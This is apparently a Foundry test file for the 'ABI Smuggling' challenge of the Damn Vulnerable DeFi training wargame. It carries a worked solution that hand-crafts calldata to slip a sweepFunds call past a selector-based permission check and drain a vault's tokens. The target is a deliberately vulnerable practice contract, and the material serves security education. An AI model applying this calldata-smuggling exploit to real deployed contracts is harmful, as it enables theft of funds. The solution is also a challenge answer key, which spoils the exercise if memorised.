// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {SelfAuthorizedVault, AuthorizedExecutor, IERC20} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";

contract ABISmugglingChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;

    DamnValuableToken token;
    SelfAuthorizedVault vault;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy vault
        vault = new SelfAuthorizedVault();

        // Set permissions in the vault
        // This is function selector for sweepFunds(address,address)
        bytes32 deployerPermission = vault.getActionId(
            hex"85fb709d",
            deployer,
            address(vault)
        );
        // This is function selector for withdraw(address,address,uint256)
        bytes32 playerPermission = vault.getActionId(
            hex"d9caed12",
            player,
            address(vault)
        );
        bytes32[] memory permissions = new bytes32[](2);
        permissions[0] = deployerPermission;
        permissions[1] = playerPermission;
        vault.setPermissions(permissions);

        // Fund the vault with tokens
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        // Vault is initialized
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertTrue(vault.initialized());

        // Token balances are correct
        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
        assertEq(token.balanceOf(player), 0);

        // Cannot call Vault directly
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.sweepFunds(deployer, IERC20(address(token)));
        vm.prank(player);
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.withdraw(address(token), player, 1e18);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_abiSmuggling() public checkSolvedByPlayer {
        
        bytes4 executeFunctionSelector = AuthorizedExecutor.execute.selector; // 1cff79cd
        bytes memory target = abi.encode(address(vault)); // 0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b264
        bytes memory bytesOffsetPointer = abi.encodePacked(uint256(100)); // 0000000000000000000000000000000000000000000000000000000000000064
        bytes32 fillerBytes; // 0000000000000000000000000000000000000000000000000000000000000000
        bytes4 withdrawFunctionSelector = SelfAuthorizedVault.withdraw.selector; // d9caed12
        bytes memory bytesLength = abi.encodePacked(uint256(68)); // 0000000000000000000000000000000000000000000000000000000000000044
        bytes memory sweepFunction = abi.encodeWithSignature( // 85fb709d + 00000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea0000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b
            "sweepFunds(address,address)",
            recovery,
            address(token)
        );
        bytes memory data = abi.encodePacked(
            executeFunctionSelector,
            target,
            bytesOffsetPointer,
            fillerBytes,
            withdrawFunctionSelector,
            bytesLength,
            sweepFunction
        );
        console.log("Data");
        console.logBytes(data);
        // 1cff79cd
        // 0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b264
        // 0000000000000000000000000000000000000000000000000000000000000064
        // 0000000000000000000000000000000000000000000000000000000000000000
        // d9caed12
        // 0000000000000000000000000000000000000000000000000000000000000044
        // 85fb709d
        // 00000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea
        // 0000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b

        address(vault).call(data);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All tokens taken from the vault and deposited into the designated recovery account
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(
            token.balanceOf(recovery),
            VAULT_TOKEN_BALANCE,
            "Not enough tokens in recovery account"
        );
    }
}
